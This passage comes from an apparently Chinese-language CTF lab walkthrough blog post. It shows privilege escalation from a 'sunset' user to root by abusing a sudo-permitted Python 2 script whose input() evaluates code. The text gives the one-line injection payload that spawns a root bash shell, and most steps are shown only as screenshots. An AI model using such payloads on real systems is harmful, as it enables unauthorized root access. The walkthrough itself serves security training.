+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812181454301.png" alt="image-20250812181454301" data-caption="image-20250812181454301" loading="lazy"></p>
+<p>该脚本属于 sunset 用户。执行此脚本，得到一个字符串。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812181750219.png" alt="image-20250812181750219" data-caption="image-20250812181750219" loading="lazy"></p>
+<p>这很可能是 sunset 用户的密码。使用 su 命令和该密码进行尝试。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812181950409.png" alt="image-20250812181950409" data-caption="image-20250812181950409" loading="lazy"></p>
+<p>成功切换到 sunset 用户。在此用户家目录下找到第一个flag。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812182309473.png" alt="image-20250812182309473" data-caption="image-20250812182309473" loading="lazy"></p>
+<h2 id="2-sunset-root"><a href="#2-sunset-root" class="headerlink" title="2.sunset -&gt; root"></a>2.sunset -&gt; root</h2><p>获取 sunset 权限后，立刻检查其 sudo 权限。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812182417525.png" alt="image-20250812182417525" data-caption="image-20250812182417525" loading="lazy"></p>
+<p>sunset 用户可以免密以 root 权限运行 &#x2F;usr&#x2F;bin&#x2F;guess_game.py 脚本。查看该脚本源码。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812182605862.png" alt="image-20250812182605862" data-caption="image-20250812182605862" loading="lazy"></p>
+<p>此脚本使用 python (即Python 2) 执行，并且在代码中使用了极其危险的 input() 函数。在Python 2中， input() 会将用户的输入当作Python代码来执行。因此，我们可以输入一段能够启动shell的Python代码，该代码将以 root 权限执行。</p>
+<p>构造并执行提权Payload:</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812182818708.png" alt="image-20250812182818708" data-caption="image-20250812182818708" loading="lazy"></p>
+<p>输入Payload–<strong>import</strong>(‘os’).system(‘&#x2F;bin&#x2F;bash’)后，成功获取 root 权限的shell。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812182924576.png" alt="image-20250812182924576" data-caption="image-20250812182924576" loading="lazy"></p>
+<p>获取最终Flag:</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812183130712.png" alt="image-20250812183130712" data-caption="image-20250812183130712" loading="lazy"></p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/LFI%E5%88%B0RCE-open%E5%87%BD%E6%95%B0/" rel="tag">LFI到RCE(open函数)</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/cgi%E6%96%87%E4%BB%B6/" rel="tag">cgi文件</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1761989925210"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">一.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E4%B8%8E%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">1.主机发现与端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">主机发现:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">端口扫描：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Web%E6%9C%8D%E5%8A%A1%E4%BE%A6%E5%AF%9F"><span class="toc-number">1.2.</span> <span class="toc-text">2.Web服务侦察</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B8%8E%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE"><span class="toc-number">2.</span> <span class="toc-text">二、漏洞发现与初始访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-CGI%E7%9B%AE%E5%BD%95%E4%B8%8E%E6%96%87%E4%BB%B6%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text">1.CGI目录与文件扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-LFI%E5%88%B0-RCE-Perl-open-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.</span> <span class="toc-text">2.LFI到 RCE (Perl open 函数漏洞)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96-www-data-Shell"><span class="toc-number">2.3.</span> <span class="toc-text">3.获取 www-data Shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">三、权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-www-data-sunset"><span class="toc-number">3.1.</span> <span class="toc-text">1.www-data -&gt; sunset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-sunset-root"><span class="toc-number">3.2.</span> <span class="toc-text">2.sunset -&gt; root</span></a></li></ol></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div></body></html>
